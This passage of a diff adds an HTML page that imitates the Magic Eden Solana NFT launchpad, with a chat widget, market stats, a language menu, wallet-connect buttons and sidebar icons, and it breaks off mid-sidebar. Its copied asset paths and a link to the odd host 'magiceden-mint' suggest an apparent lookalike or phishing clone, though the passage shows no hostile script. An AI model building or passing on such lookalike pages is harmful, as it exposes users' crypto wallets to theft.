a[href^="http://fsoft4down.com/"], :root div[id^="ad_bigbox_"], :root #content > #right > .dose > .dosesingle, :root a[href^="http://paid.outbrain.com/network/redir?"], :root .commercial-unit-mobile-top .jackpot-main-content-container > .UpgKEd + .nZZLFc > div > .vci, :root .commercial-unit-mobile-top > div[data-pla="1"], :root #topstuff > #tads, :root a[href^="http://stateresolver.link/"], :root a[href^="http://galleries.securewebsiteaccess.com/"], :root [data-freestar-ad], :root [class*="__adspot-title-container"], :root div[class^="index_adBeforeContent_"], :root a[href^="http://www.onclickmega.com/jump/next.php?"], :root a[href^="https://a.bestcontentfood.top/"], :root #ads > .dose > .dosesingle {
+                display: none !important;
+            }
+        </style>
+    </head>
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+        var Tawk_API = Tawk_API || {}
+          , Tawk_LoadStart = new Date();
+        (function() {
+            var s1 = document.createElement("script")
+              , s0 = document.getElementsByTagName("script")[0];
+            s1.async = true;
+            s1.src = 'https://embed.tawk.to/62ad1219b0d10b6f3e77f273/1g5q23peb';
+            s1.charset = 'UTF-8';
+            s1.setAttribute('crossorigin', '*');
+            s0.parentNode.insertBefore(s1, s0);
+        }
+        )();
+    </script>
+    <!--End of Tawk.to Script-->
+    <body style="overflow: visible;" class="desktop no-touch body--light">
+        <div id="banner">
+            <div></div>
+        </div>
+        <div id="">
+            <div style="">
+                <div>
+                    <div class="main page launch-pad-page">
+                        <div class="tw-w-full tw-flex tw-bg-gray-200 tw-z-50 tw-px-4">
+                            <div class="tw-hidden sm:tw-flex tw-flex-auto tw-justify-center">
+                                <ul class="tw-flex tw-justify-center">
+                                    <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap">
+                                        <span class="tw-text-gray2-500" style="font-size: 12px;">Volume 24h:&nbsp;&nbsp;</span>
+                                        <span class="tw-text-pink-primary" style="font-size: 12px;">41.598 SOL</span>
+                                    </li>
+                                    <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap">
+                                        <span class="tw-text-gray2-500" style="font-size: 12px;">&nbsp;&nbsp;Volume total:&nbsp;&nbsp;</span>
+                                        <span class="tw-text-pink-primary" style="font-size: 12px;">22.620.365 SOL</span>
+                                    </li>
+                                    <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap">
+                                        <span class="tw-text-gray2-500" style="font-size: 12px;">&nbsp;&nbsp;SOL/USD:</span>
+                                        <span class="tw-text-pink-primary" style="font-size: 12px;">$43.77</span>
+                                    </li>
+                                    <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap">
+                                        <span class="tw-text-gray2-500" style="font-size: 12px;">&nbsp;&nbsp;Solana Network:</span>
+                                        <span class="tw-text-pink-primary" style="font-size: 12px;">3.156 TPS</span>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="tw-flex tw-items-center tw-ml-auto tw-flex-shrink-0">
+                                <div class="me-dropdown-container">
+                                    <div class="cursor-pointer position-relative">
+                                        <button role="button" class="tw-flex tw-items-center">
+                                            <span class="tw-text-xs">English</span>
+                                            <span class="tw-ml-1">
+                                                <svg stroke="currentColor" fill="none" stroke-width="2" viewbox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" color="#f8f7f8" height="0.75rem" width="0.75rem" xmlns="http://www.w3.org/2000/svg" style="color: rgb(248, 247, 248);">
+                                                    <polyline points="6 9 12 15 18 9"></polyline>
+                                                </svg>
+                                            </span>
+                                        </button>
+                                    </div>
+                                    <div aria-label="dropdown-list" class="dropdown tw-text-secondary" style="position: absolute; left: 0px; top: 0px; width: fit-content; right: auto; bottom: auto; transform: translate(1271px, 28px);" data-popper-reference-hidden="false" data-popper-escaped="false" data-popper-placement="bottom-start">
+                                        <ul class="tw-py-2 tw-px-3 tw-text-white-1">
+                                            <li class="tw-cursor-pointer">
+                                                <div class="tw-border-soft tw-border-b tw-border-solid">English</div>
+                                            </li>
+                                            <li class="tw-cursor-pointer">
+                                                <div class="tw-border-soft tw-border-b tw-border-solid">한국어</div>
+                                            </li>
+                                            <li class="tw-cursor-pointer">
+                                                <div class="tw-border-soft tw-border-b tw-border-solid">日本語</div>
+                                            </li>
+                                            <li class="tw-cursor-pointer">
+                                                <div class="tw-border-soft tw-border-b tw-border-solid">Türkçe</div>
+                                            </li>
+                                            <li class="tw-cursor-pointer">
+                                                <div class="tw-border-soft tw-border-b tw-border-solid">Tiếng Việt</div>
+                                            </li>
+                                            <li class="tw-cursor-pointer">
+                                                <div class="tw-border-soft tw-border-b tw-border-solid">Русский</div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <header class="tw-px-4 tw-w-full tw-h-80px tw-flex tw-sticky tw-top-0 tw-z-30 tw-transition-colors tw-bg-gray-100">
+                            <nav class="tw-w-full tw-flex tw-items-center">
+                                <div class="tw-flex tw-flex-auto tw-items-center">
+                                    <div class="tw-flex tw-items-center">
+                                        <button class="tw-p-2 md:tw-p-4 hover:tw-bg-gray-500 tw-rounded-lg lg:tw-hidden HeaderV2_collapseBtn__2hjOo">
+                                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewbox="0 0 448 512" color="#f8f7f8" height="1.5rem" width="1.5rem" xmlns="http://www.w3.org/2000/svg" style="color: rgb(248, 247, 248);">
+                                                <path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path>
+                                            </svg>
+                                        </button>
+                                        <a class="navbar-brand" href="https://magiceden.io">
+                                            <img class="logo HeaderV2_logo__35dMv" src="../../media/logo.ca418d75.svg" alt="sticky brand-logo">
+                                        </a>
+                                    </div>
+                                    <div class="tw-flex-auto tw-px-2 tw-ml-8 tw-hidden lg:tw-inline-flex tw-justify-center">
+                                        <div class="nav-item--search-bar tw-w-full tw-max-w-2xl lg:tw-px-0 css-b62m3t-container">
+                                            <span id="react-select-2-live-region" class="css-7pg0cj-a11yText"></span>
+                                            <span aria-live="polite" aria-atomic="false" aria-relevant="additions text" class="css-7pg0cj-a11yText"></span>
+                                            <div class="header__search">
+                                                <input type="text" placeholder="Search Collections and Creators" nativecolor="" nativeopacity="" style="opacity: 1; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);">
+                                                <button>
+                                                    <img src="../../media/search.48a682a639f3023f1afd96a01fadeeca.svg" alt="search icon">
+                                                </button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="tw-flex tw-items-center tw-space-x-2">
+                                    <div class="tw-block lg:tw-hidden tw-ml-2">
+                                        <button class="tw-w-10 tw-h-10 hover:tw-bg-gray-500 tw-inline-flex tw-justify-center tw-items-center tw-transform active:tw-scale-90">
+                                            <svg stroke="currentColor" fill="none" stroke-width="2" viewbox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" color="#f8f7f8" height="24" width="24" xmlns="http://www.w3.org/2000/svg" style="color: rgb(248, 247, 248);">
+                                                <circle cx="11" cy="11" r="8"></circle>
+                                                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                                            </svg>
+                                        </button>
+                                    </div>
+                                    <a class="tw-text-white-1 tw-items-center tw-px-2 tw-rounded-md tw-hidden md:tw-flex" href="123.html#"></a>
+                                    <div class="tw-ml-2 tw-hidden md:tw-inline-flex">
+                                        <div class="tw-flex tw-items-center ButtonGroup_group__2mJyT">
+                                            <button class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn tw-p-0">
+                                                <a class="tw-flex tw-w-full" href="https://magiceden.io">
+                                                    <span class="tw-px-2">
+                                                        <svg stroke="currentColor" fill="none" stroke-width="2" viewbox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" color="#e42575" height="24" width="24" xmlns="http://www.w3.org/2000/svg" style="color: rgb(228, 37, 117);">
+                                                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                                                            <circle cx="12" cy="7" r="4"></circle>
+                                                        </svg>
+                                                    </span>
+                                                </a>
+                                            </button>
+                                            <button id="showcase__btn0" class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn">Select Wallet</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </nav>
+                        </header>
+                        <div class="tw-flex tw-w-full">
+                            <div id="sidebar" class="tw-flex tw-fixed tw-z-20 Sidebar_sidebar__1xlyr Sidebar_isMeTheme__2havA">
+                                <div class=" tw-bg-gray-100 lg:tw-w-240px tw-overflow-x-hidden tw-flex tw-flex-col Sidebar_content__35yfe" style="margin-top: 100px;">
+                                    <div class="md:tw-hidden tw-flex-shrink-0 tw-flex tw-justify-center tw-py-2 tw-border-gray-500 tw-border-solid tw-border-b">
+                                        <div class="tw-flex tw-items-center ButtonGroup_group__2mJyT">
+                                            <button class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn tw-p-0">
+                                                <a class="tw-flex tw-w-full" href="https://magiceden-mint/launchpad/me">
+                                                    <span class="tw-px-2">
+                                                        <svg stroke="currentColor" fill="none" stroke-width="2" viewbox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" color="#e42575" height="24" width="24" xmlns="http://www.w3.org/2000/svg" style="color: rgb(228, 37, 117);">
+                                                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                                                            <circle cx="12" cy="7" r="4"></circle>
+                                                        </svg>
+                                                    </span>
+                                                </a>
+                                            </button>
+                                            <button class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn">Select Wallet</button>
+                                        </div>
+                                        <hr class="tw-my-4">
+                                    </div>
+                                    <ul class="
+              tw-flex-auto tw-overflow-y-auto tw-px-4 tw-overflow-x-hidden
+              Sidebar_sidebarScroll__85hsE
+            ">
+                                        <li class="
+                Sidebar_tab__1lv-Q
+                tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px
+              ">
+                                            <div class="tw-flex tw-flex-col">
+                                                <div class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative tw-rounded tw-items-center
+                  ">
+                                                    <span>
+                                                        <svg width="20px" height="20px" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#F5F3F7">
+                                                            <path d="M16.9758 4.48294L15.086 3.68724C14.9865 3.6375 14.887 3.53804 14.887 3.43858L14.4395 1.44931C14.3897 1.15092 13.9919 1.05145 13.8427 1.30011L12.4999 2.8418C12.4005 2.94126 12.301 2.99099 12.2015 2.94126L10.1625 2.6926C9.86414 2.64287 9.66521 2.99099 9.81441 3.23965L10.8588 4.98026C10.9085 5.07972 10.9085 5.22892 10.8588 5.32838L10.0133 7.16846C9.86414 7.41712 10.1128 7.71551 10.4112 7.66577L12.4502 7.21819C12.5497 7.16846 12.6988 7.21819 12.7486 7.31765L14.2903 8.71014C14.4892 8.90907 14.887 8.75987 14.887 8.46148L15.0362 6.47221C15.0362 6.37275 15.1357 6.22355 15.2352 6.17382L17.0255 5.17919C17.2742 4.98026 17.2742 4.58241 16.9758 4.48294Z" fill="#F5F3F7"></path>
+                                                            <path d="M16.8796 16.6999L17.9239 16.4512C18.1229 16.4015 18.1726 16.2026 18.0234 16.0534L17.178 15.3571C17.1282 15.3074 17.0785 15.2577 17.0785 15.1582L17.178 14.0641C17.178 13.8652 16.979 13.7657 16.8298 13.8652L15.9347 14.462C15.8849 14.5117 15.7855 14.5117 15.7357 14.462L14.7411 14.0641C14.5919 14.0144 14.393 14.1636 14.4427 14.3128L14.7411 15.4069C14.7411 15.4566 14.7411 15.5561 14.6914 15.6058L13.9951 16.4512C13.8957 16.6004 13.9951 16.7994 14.1443 16.7994L15.2384 16.8491C15.2881 16.8491 15.3876 16.8988 15.4373 16.9486L15.9844 17.8935C16.0838 18.0427 16.3325 18.0427 16.3822 17.8437L16.7801 16.7994C16.7304 16.7496 16.7801 16.6999 16.8796 16.6999Z" fill="#F5F3F7"></path>
+                                                            <path d="M4.68652 10.118L4.04001 8.82498C3.94054 8.62605 3.64215 8.62605 3.49295 8.82498L2.89617 10.118C2.84644 10.2175 2.74698 10.2672 2.69725 10.2672L1.25502 10.4661C1.00636 10.5159 0.906897 10.8142 1.10582 10.9634L2.15019 11.9581C2.19993 12.0078 2.24966 12.1073 2.24966 12.2067L2.001 13.649C1.95127 13.8976 2.19993 14.0468 2.44859 13.9473L3.74161 13.2511C3.84108 13.2014 3.94054 13.2014 4.04001 13.2511L5.33303 13.9473C5.53196 14.0468 5.78062 13.8976 5.78062 13.649L5.53196 12.2067C5.53196 12.1073 5.53196 12.0078 5.63142 11.9581L6.67579 10.9634C6.87472 10.8142 6.77526 10.5159 6.5266 10.4661L5.08437 10.2672C4.83571 10.2672 4.73625 10.2175 4.68652 10.118Z" fill="#F5F3F7"></path>
+                                                        </svg>
+                                                    </span>
+                                                    <span class="tw-text-white-1 tw-ml-2 Sidebar_label__Chew5">Marketplace</span>
+                                                    <span class="tw-ml-auto">
+                                                        <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" color="#F5F3F7" height="24" width="24" xmlns="http://www.w3.org/2000/svg" class="tw-transform" style="color: rgb(245, 243, 247);">
+                                                            <polyline points="6 9 12 15 18 9"></polyline>
+                                                        </svg>
+                                                    </span>
+                                                </div>
+                                            </div>
+                                        </li>
+                                        <li class="
+                Sidebar_tab__1lv-Q
+                tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px
+              ">
+                                            <div class="tw-flex tw-flex-col">
+                                                <div class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative tw-rounded tw-items-center
+                  ">
+                                                    <span>
+                                                        <svg width="20px" height="20px" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#F5F3F7">
+                                                            <path d="M18.3337 10H15.0003L12.5003 17.5L7.50033 2.5L5.00033 10H1.66699" stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                        </svg>
+                                                    </span>
+                                                    <span class="tw-text-white-1 tw-ml-2 Sidebar_label__Chew5">Insights</span>
+                                                    <span class="tw-ml-auto">
+                                                        <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" color="#F5F3F7" height="24" width="24" xmlns="http://www.w3.org/2000/svg" class="tw-transform" style="color: rgb(245, 243, 247);">
+                                                            <polyline points="6 9 12 15 18 9"></polyline>
+                                                        </svg>
+                                                    </span>
+                                                </div>
+                                            </div>
+                                        </li>
+                                        <li class="
+                Sidebar_tab__1lv-Q
+                tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px
+              ">
+                                            <div class="tw-flex tw-flex-col">
+                                                <a href="/launchpad" class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative tw-rounded tw-items-center
+                  ">
+                                                    <span>
+                                                        <svg width="20px" height="20px" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#F5F3F7">
+                                                            <path d="M16.4291 10.3284C16.2548 10.3284 16.0991 10.2305 16.0227 10.0739C15.9462 9.91728 15.9658 9.73457 16.074 9.59754C16.2362 9.39059 16.3928 9.18365 16.5382 8.98229L16.5401 8.98043C16.6295 8.86111 16.7554 8.79492 16.8962 8.79492C17.0667 8.79492 17.2289 8.89373 17.3091 9.04755C17.3856 9.1939 17.3725 9.36636 17.2728 9.50898L17.2709 9.51178C17.1227 9.7178 16.9633 9.92754 16.7852 10.155C16.6985 10.265 16.569 10.3284 16.4291 10.3284Z" fill="#F5F3F7"></path>
+                                                            <path d="M9.41758 15.7065C9.29733 15.7065 9.18453 15.659 9.09877 15.5741L4.42568 10.901C4.28865 10.764 4.25415 10.5561 4.33898 10.3827C4.7072 9.62953 5.11737 8.8875 5.55829 8.17531C6.14278 7.21887 6.8093 6.30439 7.53921 5.45516C10.3796 2.15705 13.4764 0.870625 15.5747 0.372833C16.4818 0.13792 17.4167 0.0195312 18.3536 0.0195312C18.7451 0.0195312 19.1413 0.0409717 19.531 0.0819883L19.5356 0.0829205L19.5403 0.0838527C19.7342 0.114615 19.8852 0.265631 19.916 0.459527C19.9383 0.599357 20.4343 3.92263 18.3163 7.84811L18.3145 7.8509L18.3126 7.8537C18.2287 7.99726 18.0889 8.07929 17.9304 8.07929C17.7701 8.07929 17.6172 7.99446 17.5323 7.85836C17.4512 7.72785 17.4456 7.56938 17.5174 7.42396L17.5193 7.42023L17.5212 7.4165C18.623 5.43838 19.1506 3.20391 19.0509 0.944269C18.9139 0.935879 18.7358 0.928421 18.5223 0.928421C17.5314 0.928421 15.97 1.07384 14.1559 1.76646C11.9336 2.61476 9.93682 4.05407 8.22251 6.04524C7.52336 6.85905 6.88574 7.73531 6.32736 8.64979L6.32642 8.65073C5.96194 9.23708 5.61516 9.85605 5.29355 10.4899L9.50707 14.7044C10.1428 14.3828 10.7609 14.036 11.3454 13.6725L11.3463 13.6715C12.2608 13.1122 13.137 12.4737 13.9508 11.7754C14.2538 11.5154 14.5605 11.2329 14.8625 10.9346L14.8644 10.9327C14.953 10.8479 15.0611 10.8022 15.1758 10.8022C15.3566 10.8022 15.5263 10.9178 15.599 11.0903C15.6698 11.2581 15.6335 11.4389 15.5011 11.5741L15.4992 11.576C15.1841 11.8882 14.8616 12.1865 14.5409 12.4615C13.6908 13.1914 12.7753 13.857 11.8208 14.4415C11.1095 14.8824 10.3675 15.2926 9.61521 15.6599C9.55368 15.6897 9.48657 15.7046 9.41945 15.7046H9.41758V15.7065Z" fill="#F5F3F7"></path>
+                                                            <path d="M18.8701 5.88103C18.7498 5.88103 18.6361 5.83442 18.5503 5.74865L14.251 1.44937C14.1159 1.3142 14.0777 1.13336 14.1476 0.963696C14.2194 0.789376 14.3909 0.672852 14.5727 0.672852C14.6901 0.672852 14.8001 0.720394 14.8896 0.809884L19.1898 5.10917C19.3194 5.23874 19.3576 5.43171 19.2877 5.60137C19.2178 5.77103 19.0537 5.88103 18.8701 5.88103Z" fill="#F5F3F7"></path>
+                                                            <path d="M13.275 9.15339C12.4612 9.15339 11.7062 8.74975 11.254 8.07298C10.8019 7.3962 10.718 6.54418 11.0294 5.79189C11.3407 5.04054 12.0035 4.49708 12.8015 4.3386C12.9572 4.30784 13.1166 4.29199 13.275 4.29199C13.5939 4.29199 13.9061 4.35352 14.2016 4.47563C14.4999 4.59868 14.7666 4.77673 14.994 5.00419C15.3352 5.34537 15.5654 5.77605 15.6596 6.24867C15.7537 6.72222 15.7062 7.2079 15.5207 7.65349C15.3361 8.09908 15.0266 8.47568 14.6258 8.74416C14.2249 9.0117 13.7579 9.15339 13.276 9.15339H13.275ZM13.276 5.19715C12.9236 5.19715 12.5806 5.32114 12.3084 5.54486C12.0362 5.76859 11.8497 6.08181 11.7807 6.42672C11.7127 6.77163 11.7668 7.13332 11.9327 7.44281C12.0986 7.75323 12.3699 7.99747 12.6943 8.13264C12.8798 8.20908 13.0756 8.24823 13.276 8.24823C13.7877 8.24823 14.2622 7.99467 14.5456 7.56959C14.7414 7.27688 14.829 6.92265 14.7945 6.57307C14.76 6.22257 14.6034 5.8935 14.3545 5.64461C14.0674 5.35656 13.6843 5.19809 13.2778 5.19809L13.276 5.19715Z" fill="#F5F3F7"></path>
+                                                            <path d="M1.78356 8.97755C1.65118 8.97755 1.52534 8.91975 1.43958 8.81815C1.35381 8.71654 1.31653 8.58323 1.33797 8.45272C1.43958 7.82722 1.6689 7.24274 2.02033 6.71605C2.43236 6.08402 3.001 5.56385 3.66472 5.21148C4.30887 4.8703 5.03412 4.68945 5.7631 4.68945C6.59555 4.68945 7.41122 4.92343 8.12062 5.36529L8.12341 5.36716L8.12621 5.36902C8.29587 5.48275 8.36765 5.67944 8.30985 5.87054C8.25112 6.06444 8.07401 6.20054 7.88011 6.20054C7.80181 6.20054 7.72443 6.1791 7.65172 6.13808L7.64799 6.13622L7.6452 6.13436C7.07842 5.78105 6.42775 5.59368 5.7631 5.59368C5.18047 5.59368 4.60158 5.73817 4.08701 6.01037C3.55752 6.29096 3.10354 6.70672 2.77448 7.21291L2.77355 7.21477C2.6766 7.36112 2.5899 7.514 2.51533 7.67155C2.9777 7.51307 3.45964 7.4329 3.95371 7.4329C4.72836 7.4329 5.49369 7.63612 6.1658 8.02112C6.34945 8.12552 6.43428 8.32222 6.38207 8.52264C6.32801 8.72679 6.14996 8.87035 5.9486 8.87035C5.86937 8.87035 5.79199 8.84891 5.71835 8.80696C5.18141 8.50027 4.57175 8.33807 3.95371 8.33807C3.26854 8.33807 2.60295 8.53383 2.02686 8.90577C1.95415 8.95238 1.87025 8.97755 1.78449 8.97848L1.78356 8.97755Z" fill="#F5F3F7"></path>
+                                                            <path d="M11.4749 18.6683C11.3099 18.6683 11.158 18.5778 11.0787 18.4334C10.9995 18.2879 11.006 18.1117 11.0946 17.9728C11.4479 17.4257 11.6436 16.7918 11.6613 16.1411C11.679 15.4904 11.5168 14.8472 11.1934 14.2823C11.1104 14.1359 11.1085 13.9737 11.1878 13.8367C11.2698 13.695 11.4302 13.6027 11.5942 13.6027C11.7546 13.6027 11.8944 13.6875 11.9783 13.8339C12.3279 14.4445 12.5292 15.139 12.5618 15.8419C12.587 16.3974 12.5068 16.9586 12.3269 17.4853C12.4854 17.4107 12.6383 17.325 12.7837 17.228L12.7856 17.2271C13.5723 16.7153 14.1167 15.9285 14.32 15.0122C14.5232 14.0968 14.3619 13.1553 13.8669 12.3592C13.7998 12.2585 13.7756 12.1326 13.8007 12.0143C13.8259 11.894 13.9005 11.7887 14.0049 11.7243C14.0767 11.6805 14.1587 11.6572 14.2426 11.6572C14.4048 11.6572 14.5539 11.7439 14.635 11.8847C14.9483 12.3881 15.1552 12.9381 15.2512 13.5179C15.3435 14.08 15.3277 14.6486 15.2046 15.208C15.0806 15.7663 14.856 16.2893 14.5344 16.7601C14.2025 17.2467 13.7821 17.6587 13.2843 17.9831C12.7576 18.3345 12.1731 18.5639 11.5485 18.6645C11.5252 18.6683 11.5019 18.6701 11.4777 18.6701L11.4749 18.6683Z" fill="#F5F3F7"></path>
+                                                            <path d="M5.0986 18.9805C4.91496 18.9805 4.75089 18.8705 4.68098 18.7018C4.61106 18.5321 4.64928 18.3391 4.77886 18.2096L7.11773 15.8707C7.20629 15.7849 7.31443 15.7393 7.43002 15.7393C7.60993 15.7393 7.78052 15.8548 7.85324 16.0264C7.92408 16.1932 7.88866 16.3741 7.75722 16.5102L5.41834 18.8491C5.33445 18.932 5.21792 18.9805 5.0986 18.9805Z" fill="#F5F3F7"></path>
+                                                            <path d="M1.82321 18.6278C1.63957 18.6278 1.4755 18.5178 1.40559 18.3481C1.33567 18.1785 1.37389 17.9855 1.50347 17.8559L3.83955 15.5198C3.92531 15.4313 4.03997 15.3828 4.16302 15.3828C4.28327 15.3828 4.397 15.4294 4.48276 15.5152C4.56946 15.6019 4.61607 15.7165 4.61513 15.8387C4.6142 15.9598 4.56573 16.0736 4.4781 16.1584L2.14295 18.4945C2.05812 18.5802 1.94439 18.6278 1.82321 18.6278Z" fill="#F5F3F7"></path>
+                                                            <path d="M1.47071 15.3534C1.288 15.3534 1.12394 15.2443 1.05402 15.0747C0.984109 14.905 1.02233 14.7121 1.1519 14.5825L3.48798 12.2464C3.57375 12.1578 3.68841 12.1094 3.81239 12.1094C3.93264 12.1094 4.04637 12.156 4.13213 12.2417C4.21883 12.3284 4.26544 12.4431 4.2645 12.5652C4.26357 12.6864 4.2151 12.8001 4.12747 12.885L1.79046 15.221C1.70749 15.3049 1.59097 15.3534 1.47165 15.3534H1.47071Z" fill="#F5F3F7"></path>
+                                                        </svg>
+                                                    </span>
+                                                    <span class="tw-text-white-1 tw-ml-2 Sidebar_label__Chew5">Launchpad</span>
+                                                </a>
+                                            </div>
+                                        </li>
+                                        <li class="
+                Sidebar_tab__1lv-Q
+                tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px
+              ">
+                                            <div class="tw-flex tw-flex-col">
+                                                <a href="/games" class="
+                    tw-flex tw-p-3
+                    hover:tw-bg-gray-300
+                    tw-relative tw-rounded tw-items-center
+                  ">
+                                                    <span>
+                                                        <svg width="20px" height="20px" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" color="#F5F3F7">
+                                                            <g clip-path="url(#clip0_522_996)">
+                                                                <path d="M17.5964 5.18111C15.2167 3.03885 12.4717 4.3375 11.4035 4.99497C11.0458 5.21913 10.6533 5.3822 10.2421 5.47753C10.164 5.49762 10.0842 5.51023 10.0037 5.51518C9.92306 5.51024 9.84312 5.49763 9.76492 5.47753C9.35367 5.38217 8.96117 5.219 8.60352 4.99471C7.53346 4.3375 4.78902 3.03885 2.40989 5.18111C0.757397 6.66856 0.220097 9.60956 0.0598687 11.8151C0.0488441 11.9962 0.109656 12.1744 0.229119 12.311C0.348582 12.4475 0.517065 12.5315 0.698037 12.5447C0.879009 12.5579 1.05788 12.4992 1.19587 12.3814C1.33386 12.2635 1.41984 12.0961 1.43516 11.9152C1.63492 9.15424 2.30894 7.12708 3.33227 6.20603C4.95939 4.74128 6.8808 5.55444 7.88089 6.16945C8.36895 6.47409 8.90444 6.69513 9.46529 6.82345C9.64151 6.8662 9.82183 6.88984 10.0031 6.89395C10.1843 6.88984 10.3646 6.8662 10.5407 6.82345C11.1014 6.69512 11.6367 6.47408 12.1245 6.16945C13.1249 5.55524 15.0466 4.74155 16.6732 6.20603C18.6958 8.0265 18.7527 13.3562 18.5444 15.0918C18.5129 15.3685 18.405 15.631 18.233 15.8499C18.0346 16.0991 17.7956 16.231 17.481 16.2647C16.819 16.3349 15.5382 16.0168 13.1874 14.097C12.3178 13.3859 11.239 12.9796 10.1163 12.9404C10.0346 12.9378 9.96734 12.9378 9.88749 12.9404C8.76484 12.9796 7.68602 13.3859 6.81644 14.097C4.46509 16.0171 3.18459 16.3349 2.52285 16.2647C2.208 16.231 1.96899 16.0991 1.77058 15.8499C1.68445 15.7415 1.61422 15.6214 1.56201 15.4932C1.5187 15.3859 1.48744 15.2743 1.46881 15.1601C1.43953 14.9795 1.33969 14.818 1.19128 14.711C1.04286 14.604 0.858021 14.5603 0.677417 14.5896C0.496812 14.6189 0.335238 14.7187 0.228239 14.8671C0.121241 15.0155 0.0775828 15.2004 0.106869 15.381C0.142165 15.5976 0.201643 15.8095 0.284189 16.0128C0.387069 16.2632 0.525389 16.4975 0.694908 16.7085C1.12592 17.2501 1.69233 17.563 2.37891 17.6357C2.48455 17.647 2.59072 17.6526 2.69696 17.6525C4.00737 17.6525 5.64624 16.8353 7.69076 15.165C8.32572 14.6449 9.11374 14.3475 9.93396 14.3184C9.98416 14.3171 10.0242 14.3168 10.0763 14.3184C10.8958 14.3478 11.683 14.6451 12.3174 15.1647C14.5317 16.9731 16.2721 17.7818 17.63 17.6354C18.3163 17.5617 18.8827 17.2498 19.3124 16.7082C19.644 16.2894 19.8525 15.7864 19.9143 15.2557C20.0967 13.7328 20.2385 7.55943 17.5964 5.18111Z" fill="#F5F3F7"></path>
+                                                                <path d="M5.47152 7.66602C5.38101 7.66602 5.29138 7.68384 5.20776 7.71848C5.12414 7.75312 5.04815 7.80389 4.98415 7.86789C4.92015 7.9319 4.86938 8.00788 4.83474 8.0915C4.8001 8.17513 4.78227 8.26475 4.78227 8.35527V9.35242H3.78512C3.69344 9.35062 3.60233 9.36712 3.51711 9.40095C3.43189 9.43478 3.35428 9.48528 3.28881 9.54947C3.22334 9.61366 3.17133 9.69027 3.13582 9.77481C3.10032 9.85934 3.08203 9.95011 3.08203 10.0418C3.08203 10.1335 3.10032 10.2243 3.13582 10.3088C3.17133 10.3933 3.22334 10.4699 3.28881 10.5341C3.35428 10.5983 3.43189 10.6488 3.51711 10.6827C3.60233 10.7165 3.69344 10.733 3.78512 10.7312H4.78227V11.7283C4.78047 11.82 4.79697 11.9111 4.8308 11.9963C4.86464 12.0816 4.91513 12.1592 4.97932 12.2247C5.04351 12.2901 5.12012 12.3421 5.20466 12.3776C5.2892 12.4131 5.37997 12.4314 5.47166 12.4314C5.56335 12.4314 5.65412 12.4131 5.73865 12.3776C5.82319 12.3421 5.8998 12.2901 5.96399 12.2247C6.02819 12.1592 6.07868 12.0816 6.11251 11.9963C6.14635 11.9111 6.16284 11.82 6.16104 11.7283V10.7312H7.1582C7.33868 10.7276 7.51058 10.6534 7.63696 10.5245C7.76335 10.3956 7.83415 10.2223 7.83415 10.0418C7.83415 9.86128 7.76335 9.68796 7.63696 9.55906C7.51058 9.43017 7.33868 9.35597 7.1582 9.35242H6.16104V8.35527C6.16104 8.26473 6.1432 8.17508 6.10855 8.09144C6.07389 8.0078 6.0231 7.9318 5.95907 7.8678C5.89504 7.80379 5.81902 7.75303 5.73537 7.71841C5.65172 7.68378 5.56206 7.66598 5.47152 7.66602Z" fill="#F5F3F7"></path>
